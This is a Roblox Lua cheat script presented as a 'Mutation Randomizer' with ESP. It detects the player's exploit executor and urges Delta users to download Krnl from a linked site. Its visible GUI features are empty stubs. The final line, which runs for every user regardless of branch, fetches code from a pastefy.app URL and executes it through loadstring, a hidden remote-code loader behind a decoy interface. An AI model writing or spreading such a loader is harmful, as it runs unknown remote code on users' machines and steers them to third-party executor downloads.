--// Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

--// Create loading screen
local loadingGui = Instance.new("ScreenGui", PlayerGui)
loadingGui.Name = "ExecutorLoadingUI"
loadingGui.ResetOnSpawn = false

local loadingFrame = Instance.new("Frame", loadingGui)
loadingFrame.Size = UDim2.new(0, 320, 0, 100)
loadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
loadingFrame.BorderSizePixel = 0
loadingFrame.Active = true
loadingFrame.Draggable = true
Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 12)

local loadingText = Instance.new("TextLabel", loadingFrame)
loadingText.Size = UDim2.new(1, -20, 1, -20)
loadingText.Position = UDim2.new(0, 10, 0, 10)
loadingText.Text = "🔍 Identifying your executor, please wait..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.TextWrapped = true

-- Simulate loading time
task.wait(2)

--// Executor detection
local executorName = "Unknown"
if identifyexecutor then
	executorName = tostring(identifyexecutor()):lower()
elseif getexecutorname then
	executorName = tostring(getexecutorname()):lower()
elseif syn then
	executorName = "synapse"
elseif is_sirhurt_closure then
	executorName = "sirhurt"
elseif pebc_execute then
	executorName = "proto"
end

-- Remove loading screen
loadingGui:Destroy()

-- If Delta, show warning and Krnl button
if executorName:find("delta") then
	local deltaGui = Instance.new("ScreenGui", PlayerGui)
	deltaGui.Name = "DeltaWarningUI"
	deltaGui.ResetOnSpawn = false

	local frame = Instance.new("Frame", deltaGui)
	frame.Size = UDim2.new(0, 360, 0, 160)
	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
	Instance.new("UIStroke", frame).Color = Color3.fromRGB(255, 60, 60)

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, -20, 0, 80)
	label.Position = UDim2.new(0, 10, 0, 10)
	label.Text = "⚠️ You are using Delta. Please use Krnl."
	label.Font = Enum.Font.GothamBold
	label.TextColor3 = Color3.new(1, 1, 1)
	label.TextSize = 16
	label.TextWrapped = true
	label.TextYAlignment = Enum.TextYAlignment.Top
	label.BackgroundTransparency = 1

	local button2 = Instance.new("TextButton", frame)
	button2.Size = UDim2.new(0.9, 0, 0, 36)
	button2.Position = UDim2.new(0.05, 0, 0, 100)
	button2.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
	button2.Text = "🌐 Download Krnl at Krnl.vip"
	button2.Font = Enum.Font.Gotham
	button2.TextSize = 15
	button2.TextColor3 = Color3.new(0, 0, 0)
	Instance.new("UICorner", button2).CornerRadius = UDim.new(0, 8)

	button2.MouseButton1Click:Connect(function()
		setclipboard("https://krnl.vip")
		label.Text = "✅ Link copied: krnl.vip"
	end)

else
	-- Main mutation system
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")

	local mutations = {
		"Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny",
		"Tranquil", "IronSkin", "Radiant", "Rainbow", "Shocked", "Ascended"
	}
	local currentMutation = mutations[math.random(#mutations)]
	local espVisible = true

	local gui = Instance.new("ScreenGui", PlayerGui)
	gui.Name = "MutationESP_UI"
	gui.ResetOnSpawn = false

	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0, 240, 0, 200)
	frame.Position = UDim2.new(0.5, -120, 0.4, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
	Instance.new("UIStroke", frame).Color = Color3.fromRGB(80, 120, 255)

	local rainbowTextObjects = {}

	local title = Instance.new("TextLabel", frame)
	title.Size = UDim2.new(1, 0, 0, 40)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.GothamBold
	title.Text = "Mutation Randomizer"
	title.TextSize = 20
	table.insert(rainbowTextObjects, title)

	local function createButton(text, yPos, bgColor)
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0.9, 0, 0, 36)
		btn.Position = UDim2.new(0.05, 0, 0, yPos)
		btn.BackgroundColor3 = bgColor
		btn.Text = text
		btn.Font = Enum.Font.Gotham
		btn.TextSize = 16
		btn.AutoButtonColor = false
		Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
		Instance.new("UIStroke", btn).Color = Color3.fromRGB(0, 0, 0)

		btn.MouseEnter:Connect(function()
			TweenService:Create(btn, TweenInfo.new(0.2), {
				BackgroundColor3 = bgColor:Lerp(Color3.new(1, 1, 1), 0.2)
			}):Play()
		end)
		btn.MouseLeave:Connect(function()
			TweenService:Create(btn, TweenInfo.new(0.2), {
				BackgroundColor3 = bgColor
			}):Play()
		end)

		btn.Parent = frame
		table.insert(rainbowTextObjects, btn)
		return btn
	end

	local rerollBtn = createButton("🎲 Reroll Mutation", 50, Color3.fromRGB(100, 200, 255))
	local toggleBtn = createButton("👁️ Toggle ESP", 95, Color3.fromRGB(180, 255, 180))

	local credit = Instance.new("TextLabel", frame)
	credit.Size = UDim2.new(1, 0, 0, 20)
	credit.Position = UDim2.new(0, 0, 1, -20)
	credit.Text = "Made by Xenooscript"
	credit.BackgroundTransparency = 1
	credit.Font = Enum.Font.Gotham
	credit.TextSize = 13
	table.insert(rainbowTextObjects, credit)

	local function findMachine()
		for _, obj in pairs(Workspace:GetDescendants()) do
			if obj:IsA("Model") and obj.Name:lower():find("mutation") then
				return obj
			end
		end
	end

	-- Your remaining game logic here (ESP, reroll behavior, etc.)
end

loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()



